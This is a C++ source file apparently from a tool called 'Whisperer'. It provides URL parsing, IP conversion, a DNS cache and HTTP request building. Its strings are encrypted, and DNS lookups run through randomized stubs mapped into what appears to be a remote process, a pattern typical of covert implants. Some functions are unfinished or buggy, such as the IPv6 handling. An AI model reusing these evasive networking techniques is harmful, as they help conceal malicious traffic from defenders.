#include "NetworkHelper.h"

#ifndef _STRING_
#include <string>
#endif

#include "Meta.h"

#ifdef AF_INET6
#undef(AF_INET6)
#endif


#define AF_INET6     23


NetworkHelpers::NetworkHelpers(WhispererHostBlock *pHostBlock) {
	this->HostBlock = pHostBlock;
};


NetworkHelpers::~NetworkHelpers() {
	// Free cache

	for each(PIP_CACHE CacheEntry in this->CacheVector) {
		delete[] CacheEntry->IpAddress;
		delete[] CacheEntry->Host;
		delete CacheEntry;
	}
};


void NetworkHelpers::UpdateHostBlock(WhispererHostBlock *pHostBlock) {
	this->HostBlock = pHostBlock;
};


bool NetworkHelpers::CrackUrl(char *Url, char **HostOut, char **PathOut) {
	PWHISPERER_FUNCTIONS Fp = this->HostBlock->WhispererFunctions;
	unsigned long UrlLength = Utils::GetLength(Url);
	wchar_t *WideUrl = Utils::NarrowToWide(Url, UrlLength);
	char *FinalHost = NULL, *FinalPath = NULL;

	URL_COMPONENTS Components = { 0 };

	Components.dwStructSize = sizeof(URL_COMPONENTS);
	Components.dwHostNameLength = (ULONG)-1;
	Components.dwUrlPathLength = (ULONG)-1;

	if (!Fp->WinHttpCrackUrl(WideUrl, UrlLength, 0, &Components))
		return false;

	FinalHost = Utils::WideToNarrow(Components.lpszHostName, Components.dwHostNameLength);
	FinalPath = Utils::WideToNarrow(Components.lpszUrlPath, Components.dwUrlPathLength);

	*HostOut = FinalHost;
	*PathOut = FinalPath;

	delete[] WideUrl;

	return true;
};


unsigned long NetworkHelpers::IpV4ToBin(char *Ip) {
	PCHAR IpV4Format = PreKeyedEncryptedStringA("%d.%d.%d.%d");

	int Octets[4];
	unsigned long Sum = 0;


	Utils::memset(Octets, 0, 4 * sizeof(int));
	sscanf_s(Ip, IpV4Format , &Octets[3], &Octets[2], &Octets[1], &Octets[0]);

	for (int i = 0; i < 4; i++) {
		Sum <<= 8;
		Sum += Octets[i];
	}

	return Sum;
};


unsigned char *NetworkHelpers::IpV6ToBin(char *Ip) {
	PCHAR IpV6Format = PreKeyedEncryptedStringA("%d:%d:%d:%d:%d:%d:%d:%d");

	int Octets[8];
	unsigned char *Final = new unsigned char[16];

	Utils::memset(Octets, 0, 8 * sizeof(int));
	sscanf_s(Ip, IpV6Format, &Octets[7], &Octets[6], &Octets[5], &Octets[4], &Octets[3], &Octets[2], &Octets[1], &Octets[0]);

	for (int i = 0; i < 8; i++)
		((unsigned short*)Final)[i] = (unsigned short)Octets[i];


	return Final;
};


unsigned char *NetworkHelpers::BinToIpV4(unsigned long Ip, bool LittleEndian) {
	unsigned short Octets[4];
	unsigned short StringLength = 0;
	unsigned char *AllocatedBuffer = NULL;
	unsigned char *BufferPtr = NULL;
	unsigned char i = 0;

	// Write octets to buffer in reverse order and compute length of string
	for (i = 0; i < 4; i++) {
		unsigned short Octet = (Ip & (0xff << (i * 8))) >> (i * 8); // Extract octet from ip
		unsigned short EncodedLength = Octet == 0 ? 1 : 1 + (unsigned short)Utils::Log10(Octet); // log10 basically gives us n-1 digits in base 10.
		Octet += (EncodedLength << 8); // Hi: Length, Lo: Value

		Octets[LittleEndian ? 4 - 1 - i : i] = Octet;
		StringLength += EncodedLength;
		StringLength++; // Extra for period
	}

	AllocatedBuffer = new unsigned char[StringLength]();
	BufferPtr = AllocatedBuffer;

	for (i = 0; i < 4; i++) {
		unsigned short Octet = Octets[i]; // Octet = Length and Value
		unsigned short Length = Octet >> 8; // Extract length
		std::string StringRepresentation;

		Octet &= 0x00ff; // Clear length from octet, Octet = Value
		StringRepresentation = std::to_string(Octet); // Convert octet to ascii form

		Utils::memcpy(BufferPtr, (void*)StringRepresentation.c_str(), Length);
		BufferPtr += Length;
		*BufferPtr++ = i == 3 ? 0 : '.';
	}

	return AllocatedBuffer;
};


unsigned char *NetworkHelpers::BinToIpV6(unsigned char Ip[16], bool LittleEndian) {


	return NULL;
};


unsigned char *NetworkHelpers::HostToAddress(char *Host, bool *AddressType) {
	unsigned short HostLength = static_cast<unsigned short>(Utils::GetLength(Host));
	LookupHostAddress *DnsLookup;
	PWHISPERER_CONTEXT Context = NULL;
	PWHISPERER_CONTEXT RemoteContext = NULL;
	PVOID DnsLookupAddress = NULL;
	PVOID RemoteDnsLookupAddress = NULL;
	unsigned char *ResolvedIp = NULL;
	PIP_CACHE NewCacheEntry = NULL;

	if (HostLength > 256)
		return NULL;

	for each(PIP_CACHE CacheEntry in this->CacheVector) {
		if (!strcmp(CacheEntry->Host, Host)) {
			ResolvedIp = (unsigned char*)CacheEntry->IpAddress;
			break;
		}
	}

	if (ResolvedIp == NULL) { // cache miss, resolve ip and then add to the cache
		Context = this->HostBlock->AllocateContext((PVOID*)&RemoteContext);
		if (Context == NULL)
			return NULL;

		Utils::memcpy(Context->HostToResolve, Host, HostLength);

		DnsLookup = new LookupHostAddress(Utils::Rand(), Utils::Rand());
		DnsLookupAddress = this->HostBlock->MapStub(DnsLookup->get(), DnsLookup->len(), &RemoteDnsLookupAddress);
		this->HostBlock->CallStub(DnsLookupAddress, RemoteDnsLookupAddress, DnsLookup->len(), Context, RemoteContext);

		if (Context->ResolvedAddressType == AF_INET) {
			*AddressType = false;
			ResolvedIp = this->BinToIpV4(*(unsigned long*)Context->ResolvedAddress4, false);
		}
		else if (Context->ResolvedAddressType == AF_INET6) {
			*AddressType = true;
			ResolvedIp = this->BinToIpV6(Context->ResolvedAddress6, false);
		}

		if (ResolvedIp != NULL) {
			NewCacheEntry = new IP_CACHE;
			if (NewCacheEntry == NULL)
				goto ReturnIp;

			NewCacheEntry->HostLength = (unsigned char)HostLength;
			NewCacheEntry->IpLength = (unsigned char)Utils::GetLength((PCHAR)ResolvedIp);
			NewCacheEntry->IpAddress = new char[NewCacheEntry->IpLength + 1]();
			NewCacheEntry->Host = new char[NewCacheEntry->HostLength + 1]();

			if (NewCacheEntry->IpAddress == NULL || NewCacheEntry->Host == NULL) {
				delete NewCacheEntry;
				goto ReturnIp;
			}

			Utils::memcpy(NewCacheEntry->IpAddress, ResolvedIp, NewCacheEntry->IpLength);
			Utils::memcpy(NewCacheEntry->Host, Host, HostLength);

			this->CacheVector.push_back(NewCacheEntry);
		}

		delete DnsLookup;
	}

ReturnIp:
	return ResolvedIp;
};


char *NetworkHelpers::CreateHttpRequest(char *Type, char *Host, char *Path, char *Body, unsigned long BodyLength, unsigned long *LengthOut) {
	bool GetRequest = *(unsigned long*)Type == '\x00TEG';
	char *RequestHeader = NULL;
	unsigned long RequestLength = 0;

	if (GetRequest) {
		RequestLength = this->GetLength() + Utils::GetLength(Type) + Utils::GetLength(Host) + Utils::GetLength(Path);
		RequestHeader = new char[RequestLength + 1]();
		if (RequestHeader == NULL)
			return NULL;

		snprintf(RequestHeader, RequestLength, this->GetFormat(), Path, Host);
	}
	else
	{
		RequestLength = this->PostLength() + Utils::GetLength(Type) + Utils::GetLength(Host) + Utils::GetLength(Path) + BodyLength + 1 + (unsigned long)Utils::Log10(BodyLength);
		RequestHeader = new char[RequestLength + 1]();
		if (RequestHeader == NULL)
			return NULL;

		snprintf(RequestHeader, RequestLength, this->PostFormat(), Path, Host, BodyLength);
		Utils::memcpy(RequestHeader + (RequestLength - BodyLength), Body, BodyLength);
	}

	*LengthOut = RequestLength;
	return RequestHeader;
};

